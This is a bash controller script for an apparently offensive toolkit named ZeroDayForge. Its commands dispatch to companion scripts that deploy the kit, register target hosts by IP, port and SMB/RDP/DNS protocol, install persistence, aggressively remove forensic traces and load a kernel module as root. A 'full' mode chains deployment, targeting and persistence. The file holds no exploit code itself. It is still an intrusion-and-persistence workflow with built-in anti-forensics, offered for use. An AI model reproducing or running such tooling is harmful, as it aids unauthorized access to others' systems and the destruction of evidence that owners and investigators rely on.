#!/bin/bash
# Unified Dispatcher for ZeroDayForge Scripts
# Description:
#   Master controller for ZeroDayForge lifecycle (install, persist, clean, etc.)
#   Usage: ./auto.sh [command] [args...]

set -euo pipefail

# Paths
BASE_DIR="$(cd "$(dirname "$0")" && pwd)"
DEPLOY="$BASE_DIR/deploy.sh"
CONFIG="$BASE_DIR/generate_config.sh"
PERSIST="$BASE_DIR/persistence.sh"
CLEANER="$BASE_DIR/log_cleaner.sh"
SIGNTOOL="$BASE_DIR/signtool.sh"

usage() {
	cat <<EOF
ZeroDayForge Automation Tool v1.0

Usage: $0 <command> [options]

Commands:
  install                  Deploy environment (requires root)
  config <ip> <port> <proto>  Add target (proto: smb/rdp/dns)
  persist [method]        Install persistence (auto-detects OS default)
  clean [--aggressive]    Remove forensic traces (requires root)
  sign <module.ko> [--dry-run]  Load kernel module (requires root)
  full <ip> <port> <proto> Install+config+persist (without cleaning)

Options:
  -h, --help              Show this help message
  -v, --version           Show version info

EOF
	exit 1
}

require_exec() {
	[[ -x "$1" ]] || { 
		echo "Critical: Missing executable - $(basename "$1")" >&2
		exit 1
	}
}

main() {
	[[ $# -eq 0 ]] && usage

	case "$1" in
		-h|--help) usage ;;
		-v|--version) echo "ZeroDayForge Automation Tool v1.0" && exit 0 ;;

		install)
			require_exec "$DEPLOY"
			sudo "$DEPLOY"
			;;

		config)
			require_exec "$CONFIG"
			[[ $# -eq 4 ]] || { echo "Missing config parameters" >&2; usage; }
			"$CONFIG" "$2" "$3" "$4"
			;;

		persist)
			require_exec "$PERSIST"
			sudo "$PERSIST" "${2:-}"
			;;

		clean)
			require_exec "$CLEANER"
			shift
			sudo "$CLEANER" "$@"
			;;

		sign)
			require_exec "$SIGNTOOL"
			[[ $# -ge 2 ]] || { echo "Missing module path" >&2; usage; }
			sudo "$SIGNTOOL" "$2" "${3:-}"
			;;

		full)
			[[ $# -eq 4 ]] || { echo "Need IP/port/proto for full setup" >&2; usage; }
			"$0" install
			"$0" config "$2" "$3" "$4"
			"$0" persist
			echo "Full deployment complete. Run 'clean' separately if needed."
			;;

		*)
			echo "Unknown command: $1" >&2
			usage
			;;
	esac
}

main "$@"
